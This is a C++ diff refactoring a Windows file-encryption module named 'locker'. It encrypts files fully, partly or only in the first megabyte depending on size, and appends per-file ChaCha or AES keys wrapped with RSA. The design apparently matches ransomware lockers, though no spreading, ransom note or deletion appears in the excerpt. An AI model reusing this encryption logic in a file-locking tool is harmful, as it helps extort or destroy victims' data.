@@ -55,7 +55,7 @@ STATIC BOOL WriteFullData
 
 BOOL filesystem::getParseFile
 (
-	locker::PFILE_INFO FileInfo
+	PFILE_INFO FileInfo
 )
 {	
 	HANDLE hFile = NULL;	
@@ -84,18 +84,32 @@ BOOL filesystem::getParseFile
 	return TRUE;
 }
 
-BOOL filesystem::EncryptFileFullData
-(
-	locker::PFILE_INFO FileInfo,
-	WCHAR* newFilename
-)
+BOOL filesystem::CreateFileOpen(PFILE_INFO FileInfo)
+{
+	 HANDLE hNewFile = CreateFileW(FileInfo->newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
+	if (hNewFile == INVALID_HANDLE_VALUE)
+	{
+		printf_s("Failed Create File %ls GetLastError = %lu\n", FileInfo->newFilename, GetLastError());		
+		FileInfo->newFileHandle = INVALID_HANDLE_VALUE;
+		return FALSE;
+	}
+	FileInfo->newFileHandle = hNewFile;
+	return TRUE;
+}
+
+BOOL filesystem::EncryptFileFullData(PFILE_INFO FileInfo)
 {
 	DWORD BytesRead = FileInfo->Filesize;
-	BYTE* FileBuffer = NULL;
-	FileBuffer = (BYTE*)memory::m_malloc(BytesRead);
+	DWORD padding = 0;	
+	BOOL isAes = FileInfo->CryptInfo->method_policy == AES256 || FileInfo->CryptInfo->method_policy == RSA_AES256;
+	if (isAes && global::GetDeCrypt() == EncryptCipher::CRYPT)
+		padding = aes256_padding(BytesRead) - BytesRead;
+		
+	
+	BYTE* FileBuffer = (BYTE*)memory::m_malloc(BytesRead + padding);
 	if (!FileBuffer)
 	{
-		printf_s("Large File Size %ls. Buffer heap crash\n", FileInfo->Filename);
+		printf_s("Large File Size %ls. Buffer heap crash.\n", FileInfo->Filename);
 		return FALSE;
 	}
 
@@ -103,31 +117,23 @@ BOOL filesystem::EncryptFileFullData
 	if (!ReadFile(FileInfo->FileHandle, FileBuffer, BytesRead, &dwread, NULL))
 	{
 		printf_s("File %ls is failed to ReadFile.\n", FileInfo->Filename);
-		memory::m_free(FileBuffer);		
-		return FALSE;
-	}
-	HANDLE hNewFile = NULL;
-	hNewFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
-	if (hNewFile == INVALID_HANDLE_VALUE)
-	{
-		printf_s("Failed Create File %ls GetLastError = %lu\n", newFilename, GetLastError());
 		memory::m_free(FileBuffer);
-		FileInfo->newFileHandle = hNewFile;
 		return FALSE;
 	}
-	FileInfo->newFileHandle = hNewFile;
-
-	LARGE_INTEGER Offset;
-	Offset.QuadPart = -((LONGLONG)BytesRead);	
-	if (!SetFilePointerEx(hNewFile, Offset, NULL, FILE_END)) {  }
 	
-	ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, FileBuffer, FileBuffer, BytesRead);
+	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, FileBuffer, FileBuffer, BytesRead);
 	
-	if (!WriteFullData(hNewFile, FileBuffer, BytesRead))
+	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, BytesRead + padding))
 	{
 		printf_s("File %ls is failed to write\n", FileInfo->Filename);
 		memory::m_free(FileBuffer);
 		return FALSE;
+	}
+	
+	if(isAes && global::GetDeCrypt() == EncryptCipher::DECRYPT)
+	{
+		SetFilePointer(FileInfo->newFileHandle, -FileInfo->CryptInfo->padding, NULL, FILE_END);
+		SetEndOfFile(FileInfo->newFileHandle);
 	}
 
 	memory::m_free(FileBuffer);	
@@ -137,22 +143,20 @@ BOOL filesystem::EncryptFileFullData
 
 BOOL filesystem::EncryptFilePartly
 (
-	locker::PFILE_INFO FileInfo,
-	WCHAR* newFilename,
+	PFILE_INFO FileInfo,	
 	BYTE DataPercent
 )
 {
-	BOOL SUCCESS = FALSE;
+	BOOL success = FALSE;
+	DWORD multiply = 0;
 	DWORD BytesRead;
 	DWORD BytesReadW;
 	LONGLONG TotalRead;
 	LONGLONG PartSize = 0;
 	LONGLONG StepSize = 0;
 	INT StepsCount = 0;
-	LONGLONG Size = FileInfo->Filesize;
+	LONGLONG Size = FileInfo->Filesize;	
 	DataPercent = 20;
-	if (FileInfo->bit)
-		Size -= FileInfo->bit;
 	switch (DataPercent)
 	{
 	case 20:
@@ -170,7 +174,19 @@ BOOL filesystem::EncryptFilePartly
 	default:
 		return FALSE;
 	}
+	
+	BOOL isAes = FileInfo->CryptInfo->method_policy == AES256 || FileInfo->CryptInfo->method_policy == RSA_AES256;
+	if (isAes)
+	{
+		if (PartSize < AES_BLOCK_SIZE)
+		{
+			printf("Failed EncryptFilePartly small size file, size must be >= 300 byte. Filename: %ls\n", FileInfo->Filename);
+			return FALSE;
+		}
+		multiply = PartSize % 16;
+	}
 
+		
 	BYTE* BufferPart = (BYTE*)memory::m_malloc(PartSize);
 	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
 	if (!BufferPart || !BufferStep)
@@ -179,217 +195,212 @@ BOOL filesystem::EncryptFilePartly
 		return FALSE;
 	}
 
-	HANDLE hFile = NULL;
-	hFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
-	if (hFile == INVALID_HANDLE_VALUE)
-	{
-		printf_s("File %ls is already open by another program.\n", newFilename);
-		FileInfo->newFileHandle = hFile;
-		memory::m_free(BufferPart);
-		memory::m_free(BufferStep);
-		return FALSE;
-	}
-	FileInfo->newFileHandle = hFile;
-
-
 	for (INT i = 0; i < StepsCount; ++i)
 	{
 		if (!ReadFile(FileInfo->FileHandle, BufferPart, PartSize, &BytesRead, NULL) || !BytesRead)
 		{	 
 			printf_s("File %ls is failed to Read Data.\n", FileInfo->FilePath);
-			memory::m_free(BufferPart);
-			memory::m_free(BufferStep);
-			return FALSE;
+			goto end;
 		}
 
-		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, BufferPart, BufferPart, BytesRead);
+		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, BufferPart, BufferPart, BytesRead - multiply);
 
-		if (!WriteFullData(hFile, BufferPart, BytesRead))
+		if (!WriteFullData(FileInfo->newFileHandle, BufferPart, BytesRead))
 		{
-			printf_s("File %ls is failed to Write data.\n", newFilename);
-			memory::m_free(BufferPart);
-			memory::m_free(BufferStep);
-			return FALSE;
+			printf_s("File %ls is failed to Write data.\n", FileInfo->FilePath);
+			goto end;
 		}
 		TotalRead = 0;
 		while (TotalRead < StepSize)
 		{
 			if (!ReadFile(FileInfo->FileHandle, BufferStep, StepSize, &BytesReadW, NULL) || !BytesReadW)
 				break;
-			if (!WriteFullData(hFile, BufferStep, BytesReadW))
+			if (!WriteFullData(FileInfo->newFileHandle, BufferStep, BytesReadW))
 				break;
 			TotalRead += BytesReadW;
 		}
 	}
 
-	memory::m_free(BufferPart);
-	memory::m_free(BufferStep);	
+	success = TRUE;
 
-	return TRUE;
+end:
+	if(BufferPart)
+		memory::m_free(BufferPart);
+	if(BufferStep)
+		memory::m_free(BufferStep);	
+
+	return success;
 }
 
 BOOL filesystem::EncryptFileBlock
 (
-	locker::PFILE_INFO FileInfo,
-	WCHAR* newFilename
+	PFILE_INFO FileInfo	
 )
 {
+	BOOL success = FALSE;
 	DWORD BytesRead;
-	CHAR* Buffer = (CHAR*)memory::m_malloc(1048576); // 1 MB
-	if (!Buffer)
-	{
-		printf_s("Failed alloc memory\n");
-		return FALSE;
-	}
-	HANDLE hCryptFile = NULL;
-	hCryptFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
-	if (hCryptFile == INVALID_HANDLE_VALUE)
-	{
-		printf_s("Failed Create File %ls\n", newFilename);
-		FileInfo->newFileHandle = hCryptFile;
-		return FALSE;
-	}
-	FileInfo->newFileHandle = hCryptFile;
+	u32 padding = 0;
+	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576 + AES_BLOCK_SIZE); // 1 MB
 
 	while(ReadFile(FileInfo->FileHandle, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
 	{
-		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)Buffer, (BYTE*)Buffer, BytesRead);
+		if (FileInfo->CryptInfo->method_policy == AES256 && BytesRead < 1048576)
+		{
+			if (FileInfo->CryptInfo->mode == MODE_AES::AES_CRYPT_NO_PADDING)
+			{
+				FileInfo->CryptInfo->mode = MODE_AES::AES_CRYPT;				
+				padding = aes256_padding(BytesRead) - BytesRead;
+			}
+			else if(FileInfo->CryptInfo->mode == MODE_AES::AES_DECRYPT_NO_PADDING)
+				FileInfo->CryptInfo->mode = MODE_AES::AES_DECRYPT;			
+		}
+			
+		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, Buffer, Buffer, BytesRead);
 
-		if (!WriteFullData(hCryptFile, Buffer, BytesRead))
+		if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead + padding))
 		{
 			printf_s("WriteFullData failed. GetLastError = %lu.\n", GetLastError());
-			return FALSE;
-		}		
+			goto end;
+		}
 	}
 
+	if (FileInfo->CryptInfo->method_policy == AES256 && global::GetDeCrypt() == EncryptCipher::DECRYPT)
+	{
+		SetFilePointer(FileInfo->newFileHandle, -FileInfo->CryptInfo->padding, NULL, FILE_END);
+		SetEndOfFile(FileInfo->newFileHandle);
+	}
 
+	success = TRUE;
+end:
 	memory::m_free(Buffer);
-	
-	
 	return TRUE;
 }
 
 BOOL filesystem::EncryptFileHeader
 (
-	locker::PFILE_INFO FileInfo,
-	WCHAR* newFilename
+	PFILE_INFO FileInfo
 )
 {
-	if (FileInfo->Filesize < 1048576)
+	if (FileInfo->Filesize < 1052599)
 	{
-		printf_s("For EncryptFileHeader FileSize must be > 1 MB. %ls\n", FileInfo->Filename);
+		printf_s("For EncryptFileHeader FileSize must be > 1.03 KB. %ls\n", FileInfo->Filename);		
 		return FALSE;
 	}
-	HANDLE hCryptFile = NULL;
-	hCryptFile = CreateFileW(newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);
-	FileInfo->newFileHandle = hCryptFile;
-	if (hCryptFile == INVALID_HANDLE_VALUE)
-	{
-		printf_s("Failed Create File %ls\n", newFilename);
-		return FALSE;
-	}	
 
+	BOOL success = FALSE;
 	DWORD BytesEncrypt = 1048576;
 	DWORD BytesRead;
-	DWORD TotalRead = 0;
-	BYTE* Buffer = NULL;
-	Buffer = (BYTE*)memory::m_malloc(BytesEncrypt);
-
-	while (TotalRead < BytesEncrypt)
+	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
+	if (!Buffer)
 	{
-		if (!ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL) || !BytesRead)
-		{
-			printf_s("File %ls is failed to Read Data.\n", FileInfo->FilePath);
-			memory::m_free(Buffer);
-			return FALSE;
-		}
-		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);
-		if (!WriteFullData(hCryptFile, Buffer, BytesRead))
-		{
-			printf_s("WriteFullData failed. GetLastError = %lu.\n", GetLastError());
-			memory::m_free(Buffer);
-			return FALSE;
-		}
-		TotalRead += BytesRead;
+		printf("Heap Crash\n");
+		return FALSE;
+	}
+	if (!ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL))
+	{
+		printf_s("Failed EncryptFileHeader ReadFile in %ls; GetLastError = %lu\n", FileInfo->Filename, GetLastError());
+		goto end;
 	}
 	
-	while (!ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL) || BytesRead != 0)
+	if (BytesRead == 0)
 	{
-		if (!WriteFullData(hCryptFile, Buffer, BytesRead))
+		printf_s("Unexpected BytesRead. GetLastError = %lu\n", GetLastError());
+		goto end;
+	}
+
+	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);
+	
+	if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesEncrypt))
+	{
+		printf_s("WriteFullData failed. GetLastError = %lu.\n", GetLastError());
+		goto end;
+	}
+
+	while (ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL) && BytesRead != 0)
+	{
+		if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead))
 		{
 			printf_s("WriteFullData failed. GetLastError = %lu.\n", GetLastError());
-			memory::m_free(Buffer);
-			return FALSE;
-		}		
+			goto end;
+		}
 	}
 
+	success = TRUE;
+
+end:
 	memory::m_free(Buffer);
-	return TRUE;
+	return success;
 }
 
+
+// TODO
 BOOL filesystem::ReadFile_
 (
-	locker::PFILE_INFO FileInfo
-)
-{
-	HANDLE hFile = CreateFileW(FileInfo->FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+	PFILE_INFO FileInfo
+) {return FALSE;}
 
-	if (hFile == INVALID_HANDLE_VALUE)
-	{
-		printf_s("File %ls is already open by another program.\n", FileInfo->Filename);
-		CloseHandle(hFile);
-		return FALSE;
-	}
-
-	LARGE_INTEGER FileSize;
-	if (!GetFileSizeEx(hFile, &FileSize))
-	{
-		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
-		CloseHandle(hFile);
-		return FALSE;
-	}
-	if (!FileSize.QuadPart)
-	{
-		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
-		CloseHandle(hFile);
-		return FALSE;
-	}
-
-	LPSTR FileBuffer = (CHAR*)memory::m_malloc(FileSize.QuadPart);
-	if (!FileBuffer)
-	{
-		memory::m_free(FileBuffer);
-		CloseHandle(hFile);
-		return FALSE;
-	}
-
-	DWORD dwread = 0;
-	BOOL Success = ReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL);
-	DWORD BytesRead = FileSize.QuadPart;
-	if (!Success || dwread != BytesRead)
-	{
-		printf_s("File %ls is failed to ReadFile.\n", FileInfo->FilePath);
-		memory::m_free(FileBuffer);
-		CloseHandle(FileInfo->FileHandle);
-		return FALSE;
-	}
-
-	BOOL SUCCESSS;
-
-	LARGE_INTEGER Offset;
-	Offset.QuadPart = -((LONGLONG)dwread);
-
-	ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, (BYTE*)FileBuffer, (BYTE*)FileBuffer, BytesRead);
-
-	printf_s("%s", FileBuffer);
-
-	RtlSecureZeroMemory(FileBuffer, sizeof(FileBuffer));
-	memory::m_free(FileBuffer);
-	CloseHandle(hFile);
-
-
-	return TRUE;
-}
+//BOOL filesystem::ReadFile_
+//(
+//	locker::PFILE_INFO FileInfo
+//)
+//{
+//	HANDLE hFile = CreateFileW(FileInfo->FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+//
+//	if (hFile == INVALID_HANDLE_VALUE)
+//	{
+//		printf_s("File %ls is already open by another program.\n", FileInfo->Filename);
+//		CloseHandle(hFile);
+//		return FALSE;
+//	}
+//
+//	LARGE_INTEGER FileSize;
+//	if (!GetFileSizeEx(hFile, &FileSize))
+//	{
+//		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
+//		CloseHandle(hFile);
+//		return FALSE;
+//	}
+//	if (!FileSize.QuadPart)
+//	{
+//		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
+//		CloseHandle(hFile);
+//		return FALSE;
+//	}
+//
+//	BYTE* FileBuffer = (BYTE*)memory::m_malloc(FileSize.QuadPart);
+//	if (!FileBuffer)
+//	{
+//		memory::m_free(FileBuffer);
+//		CloseHandle(hFile);
+//		return FALSE;
+//	}
+//
+//	DWORD dwread = 0;
+//	BOOL Success = ReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL);
+//	DWORD BytesRead = FileSize.QuadPart;
+//	if (!Success || dwread != BytesRead)
+//	{
+//		printf_s("File %ls is failed to ReadFile.\n", FileInfo->FilePath);
+//		memory::m_free(FileBuffer);
+//		CloseHandle(FileInfo->FileHandle);
+//		return FALSE;
+//	}
+//
+//	BOOL SUCCESSS;
+//
+//	LARGE_INTEGER Offset;
+//	Offset.QuadPart = -((LONGLONG)dwread);
+//	
+//	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, FileBuffer, FileBuffer, BytesRead);
+//	printf_s("%s", FileBuffer);
+//
+//	RtlSecureZeroMemory(FileBuffer, sizeof(FileBuffer));
+//	memory::m_free(FileBuffer);
+//	CloseHandle(hFile);
+//
+//
+//	return TRUE;
+//}
 
 
 HMODULE hCrypt32 = NULL;
@@ -811,7 +822,7 @@ BOOL filesystem::EncryptRSA
 	}
 	
 
-	if (global::GetDeCrypt() == CRYPT)
+	if (global::GetDeCrypt() == EncryptCipher::CRYPT)
 	{
 		if (!CryptEncrypt(RsaKey, 0, TRUE, 0, FileBuffer, &size, dwDataLen))
 		{
@@ -820,7 +831,7 @@ BOOL filesystem::EncryptRSA
 			goto END;
 		}
 	}
-	else if (global::GetDeCrypt() == DECRYPT)
+	else if (global::GetDeCrypt() == EncryptCipher::DECRYPT)
 	{
 		if (!CryptDecrypt(RsaKey, 0, TRUE, 0, FileBuffer, &size))
 		{
@@ -862,33 +873,32 @@ END:
 
 STATIC BOOL GenKey
 (
-	locker::PFILE_INFO FileInfo,
+	PFILE_INFO FileInfo,
 	HCRYPTPROV Provider,
 	HCRYPTKEY PublicKey,
-	BYTE* ChachaKey,
-	BYTE* ChachaIV,
+	BYTE* CryptKey,
+	BYTE* CryptIV,
 	BYTE* EncryptedKey,
 	size_t BuffLenBytes
 )
 {
 	DWORD dwDataLen = 40;
 
-	if (!CryptGenRandom(Provider, 32, ChachaKey))
+	if (!CryptGenRandom(Provider, 32, CryptKey))
 	{
 		return FALSE;
 	}
 
-	if (!CryptGenRandom(Provider, 8, ChachaIV))
+	if (!CryptGenRandom(Provider, 8, CryptIV))
 	{
 		return FALSE;
 	}
+	
 
-	RtlSecureZeroMemory(&FileInfo->CryptCtx, sizeof(FileInfo->CryptCtx));
-	ECRYPT_keysetup(&FileInfo->CryptCtx, ChachaKey, 256, 64);
-	ECRYPT_ivsetup(&FileInfo->CryptCtx, ChachaIV);
+	FileInfo->CryptInfo->gen_key_method(FileInfo->CryptInfo->ctx, CryptKey, CryptIV);
 
-	memory::Copy(EncryptedKey, ChachaKey, 32);
-	memory::Copy(EncryptedKey + 32, ChachaIV, 8);
+	memory::Copy(EncryptedKey, CryptKey, 32);
+	memory::Copy(EncryptedKey + 32, CryptIV, 8);
 
 	if (!CryptEncrypt(PublicKey, 0, TRUE, 0, EncryptedKey, &dwDataLen, BuffLenBytes))
 	{
@@ -902,15 +912,15 @@ STATIC BOOL GenKey
 
 STATIC BOOL WriteEncryptInfo
 (
-	locker::PFILE_INFO FileInfo,
+	PFILE_INFO FileInfo,
 	BYTE* EncryptedKey,
 	size_t size,
-	INT EncryptMode	
+	EncryptModes EncryptMode
 )
 {
 	BYTE Buffer[4];
 	memset((VOID*)Buffer, 0, 4);
-	Buffer[0] = EncryptMode + 100;
+	Buffer[0] = static_cast<INT>(EncryptMode) + 100;
 	std::string strbit = std::to_string((size + 1) << 31 | (size + 1) >> 1);
 	memcpy_s((VOID*)&Buffer[1], 3, strbit.c_str(), strbit.size());
 	LARGE_INTEGER Offset;
@@ -941,16 +951,17 @@ STATIC BOOL WriteEncryptInfo
 
 BOOL filesystem::FileCryptEncrypt
 (
+	CRYPT_INFO* CryptInfo,
 	WCHAR* KeyFile,
 	WCHAR* FileCrypt,
 	WCHAR* newFilename
 )
 {	
 	locker::FILE_INFO FileInfo;
+	FileInfo.CryptInfo = CryptInfo;
 	FileInfo.Filename = FileCrypt;
 	FileInfo.FilePath = FileCrypt;
-	FileInfo.newFilename = newFilename;
-	FileInfo.bit = 0;
+	FileInfo.newFilename = newFilename;	
 	FileInfo.FileHandle = NULL;
 	FileInfo.newFileHandle = NULL;
 	HCRYPTPROV CryptoProvider = 0;
@@ -960,111 +971,114 @@ BOOL filesystem::FileCryptEncrypt
 	BYTE* EncryptedKey = NULL;	
 	DWORD size = 0;	
 	BYTE PublicKey[4096] = { 0 };
-
+	
 	if (!ReadRSAFile(KeyFile, PublicKey, &RsaKey, &CryptoProvider))
 	{
 		printf_s("Failed get RSA File - %ls. GetLastError = %lu.\n", KeyFile, GetLastError());
 		return FALSE;
 	}
 	
-
+	
 	if (!getParseFile(&FileInfo) || FileInfo.FileHandle == INVALID_HANDLE_VALUE)
 	{
 		printf_s("Failed getParseInfo %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
 		goto END;
 	}
-	
+	if (!CreateFileOpen(&FileInfo) && FileInfo.newFileHandle == INVALID_HANDLE_VALUE)
+		goto END;
+
 	CryptEncrypt(RsaKey, 0, TRUE, 0, NULL, &size, 0);
 	if (size == 0)
 	{
 		printf_s("Failed get LenthBitRSA %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
-		return FALSE;
+		goto END;
 	}
 	size += 13;
 	EncryptedKey = (BYTE*)memory::m_malloc(size);
-	BYTE ChachaIV[8];
-	BYTE ChachaKey[32];
-	if (!GenKey(&FileInfo, CryptoProvider, RsaKey, ChachaKey, ChachaIV, EncryptedKey, size))
+	BYTE CryptIV[8];
+	BYTE CryptKey[32];
+	if (!GenKey(&FileInfo, CryptoProvider, RsaKey, CryptKey, CryptIV, EncryptedKey, size))
 	{
 		printf_s("Can't gen key for file %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
 		goto END;
 	}
-
-	if (global::GetEncMode() == AUTO_ENCRYPT)
+	
+	if (global::GetEncMode() == EncryptModes::AUTO_ENCRYPT)
 	{
 		if (FileInfo.Filesize <= 1048576)
 		{			
-			if (!EncryptFileFullData(&FileInfo, newFilename))
+			if (!EncryptFileFullData(&FileInfo))
 			{
 				printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
 				goto END;
 			}			
-			WriteEncryptInfo(&FileInfo, EncryptedKey, size, FULL_ENCRYPT);
+			WriteEncryptInfo(&FileInfo, EncryptedKey, size, EncryptModes::FULL_ENCRYPT);
 		}
 		else if (FileInfo.Filesize <= 5242880)
 		{
-			if (!EncryptFilePartly(&FileInfo, newFilename, 20))
+			if (!EncryptFilePartly(&FileInfo, 20))
 			{
 				printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
 				goto END;
 			}
-			WriteEncryptInfo(&FileInfo, EncryptedKey, size, PARTLY_ENCRYPT);
+			WriteEncryptInfo(&FileInfo, EncryptedKey, size, EncryptModes::PARTLY_ENCRYPT);
 		}
 		else
 		{
-			if (!EncryptFileHeader(&FileInfo, newFilename))
+			if (!EncryptFileHeader(&FileInfo))
 			{
 				printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
 				goto END;
 			}
-			WriteEncryptInfo(&FileInfo, EncryptedKey, size, HEADER_ENCRYPT);
+			WriteEncryptInfo(&FileInfo, EncryptedKey, size, EncryptModes::HEADER_ENCRYPT);
 		}
 	}
-	else if (global::GetEncMode() == FULL_ENCRYPT)	
+	else if (global::GetEncMode() == EncryptModes::FULL_ENCRYPT)
 	{		
-		if (!EncryptFileFullData(&FileInfo, newFilename))
+		if (!EncryptFileFullData(&FileInfo))
 		{
 			printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}		
-		WriteEncryptInfo(&FileInfo, EncryptedKey, size, FULL_ENCRYPT);
+		WriteEncryptInfo(&FileInfo, EncryptedKey, size, EncryptModes::FULL_ENCRYPT);
 	}
-	else if (global::GetEncMode() == PARTLY_ENCRYPT)	
+	else if (global::GetEncMode() == EncryptModes::PARTLY_ENCRYPT)
 	{		
-		if(!EncryptFilePartly(&FileInfo, newFilename, 20))
+		if(!EncryptFilePartly(&FileInfo, 20))
 		{
 			printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}
-		WriteEncryptInfo(&FileInfo, EncryptedKey, size, PARTLY_ENCRYPT);
+		WriteEncryptInfo(&FileInfo, EncryptedKey, size, EncryptModes::PARTLY_ENCRYPT);
 	}
-	else if (global::GetEncMode() == HEADER_ENCRYPT)
+	else if (global::GetEncMode() == EncryptModes::HEADER_ENCRYPT)
 	{
 
-		if (!EncryptFileHeader(&FileInfo, newFilename))
+		if (!EncryptFileHeader(&FileInfo))
 		{
 			printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}
-		WriteEncryptInfo(&FileInfo, EncryptedKey, size, HEADER_ENCRYPT);
+		WriteEncryptInfo(&FileInfo, EncryptedKey, size, EncryptModes::HEADER_ENCRYPT);
 	}
-	else if (global::GetEncMode() == BLOCK_ENCRYPT)
+	else if (global::GetEncMode() == EncryptModes::BLOCK_ENCRYPT)
 	{
-		if (!EncryptFileBlock(&FileInfo, newFilename))
+		if (!EncryptFileBlock(&FileInfo))
 		{
 			printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", FileCrypt, GetLastError());
 			goto END;
 		}
-		WriteEncryptInfo(&FileInfo, EncryptedKey, size, BLOCK_ENCRYPT);
+		WriteEncryptInfo(&FileInfo, EncryptedKey, size, EncryptModes::BLOCK_ENCRYPT);
 	}
 	
 	SUCCESS_return = TRUE;
 END:
+	memory::memzero_explicit(PublicKey, 4096);
 	if (EncryptedKey)
 	{
-		RtlSecureZeroMemory(EncryptedKey, size);
-		RtlSecureZeroMemory(ChachaIV, 8);
-		RtlSecureZeroMemory(ChachaKey, 32);
+		memory::memzero_explicit(EncryptedKey, size);
+		memory::memzero_explicit(CryptIV, 8);
+		memory::memzero_explicit(CryptKey, 32);
 		memory::m_free(EncryptedKey);
 	}
 	if(hCryptFile)
@@ -1087,7 +1101,7 @@ STATIC BYTE* ReadEncryptInfo
 (
 	HANDLE handle,
 	DWORD* Bit,
-	INT* mode_
+	EncryptModes* mode_
 )
 {
 	LARGE_INTEGER Offset;	
@@ -1131,30 +1145,33 @@ STATIC BYTE* ReadEncryptInfo
 	}
 	
 	*Bit = size_bit + 4;
-	*mode_ = mode;
+	*mode_ = static_cast<EncryptModes>(mode);
 	return read_key;
 }
 
 
 BOOL filesystem::FileCryptDecrypt
 (
+	CRYPT_INFO* CryptInfo,
 	WCHAR* KeyFile,
 	WCHAR* FileCrypt,
 	WCHAR* newFilename
 )
 {
-	locker::FILE_INFO FileInfo;
+	FILE_INFO FileInfo;
+	FileInfo.CryptInfo = CryptInfo;
 	FileInfo.FilePath = FileCrypt;
 	FileInfo.Filename = FileCrypt;
+	FileInfo.newFilename = newFilename;
 	FileInfo.newFileHandle = NULL;
-	FileInfo.FileHandle = NULL;
+	FileInfo.FileHandle = NULL;	
+	BOOL SUCCESS_return = FALSE;
 	HCRYPTPROV CryptoProvider = 0;
 	HCRYPTKEY RsaKey = 0;
-	BOOL SUCCESS_return = FALSE;
 	BYTE* EncryptedKey = NULL;
 	DWORD EncryptedKeySize = 0;	
-	LONG cat;
-	INT mode;
+	EncryptModes mode;
+	DWORD cat;
 	BYTE PrivateKey[4096] = { 0 };
 
 	DWORD dwDataLen = 0;
@@ -1169,31 +1186,37 @@ BOOL filesystem::FileCryptDecrypt
 		printf_s("Failed ParseFile %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
 		goto END;
 	}	
+	if (!filesystem::CreateFileOpen(&FileInfo) && FileInfo.newFileHandle == INVALID_HANDLE_VALUE)
+		goto END;
 
 	EncryptedKey = ReadEncryptInfo(FileInfo.FileHandle, &EncryptedKeySize, &mode);
 	if (EncryptedKey == NULL)	goto END;
-	FileInfo.bit = EncryptedKeySize;
-	cat = EncryptedKeySize;
-
+	FileInfo.Filesize -= EncryptedKeySize;
+	if (SetFilePointer(FileInfo.FileHandle, -(LONG)EncryptedKeySize, NULL, FILE_END))
+	{
+		SetEndOfFile(FileInfo.FileHandle);
+		SetFilePointer(FileInfo.FileHandle, 0, NULL, FILE_BEGIN);
+	}
 	if (!CryptDecrypt(RsaKey, 0, TRUE, 0, EncryptedKey, &EncryptedKeySize))	
 	{
 		printf_s("Failed CryptDecrypt. GetLastError = %lu\n", GetLastError());			
 		goto END;
 	}
+
+
+	BYTE CryptIV[8];
+	BYTE CryptKey[32];
+
+	memory::Copy(CryptKey, EncryptedKey, 32);
+	memory::Copy(CryptIV, EncryptedKey + 32, 8);
+	FileInfo.CryptInfo->gen_key_method(FileInfo.CryptInfo->ctx, CryptKey, CryptIV);	
 	
-	BYTE ChachaIV[8];
-	BYTE ChachaKey[32];
 
-	memory::Copy(ChachaKey, EncryptedKey, 32);
-	memory::Copy(ChachaIV, EncryptedKey + 32, 8);
-	ECRYPT_keysetup(&FileInfo.CryptCtx, ChachaKey, 256, 64);
-	ECRYPT_ivsetup(&FileInfo.CryptCtx, ChachaIV);
-
-	if (mode == AUTO_ENCRYPT)
+	if (mode == EncryptModes::AUTO_ENCRYPT)
 	{
 		if (FileInfo.Filesize <= 1048576)
 		{
-			if (!EncryptFileFullData(&FileInfo, newFilename))
+			if (!EncryptFileFullData(&FileInfo))
 			{
 				printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
 				goto END;
@@ -1201,7 +1224,7 @@ BOOL filesystem::FileCryptDecrypt
 		}
 		else if (FileInfo.Filesize <= 5242880)
 		{
-			if (!EncryptFilePartly(&FileInfo, newFilename, 20))
+			if (!EncryptFilePartly(&FileInfo, 20))
 			{
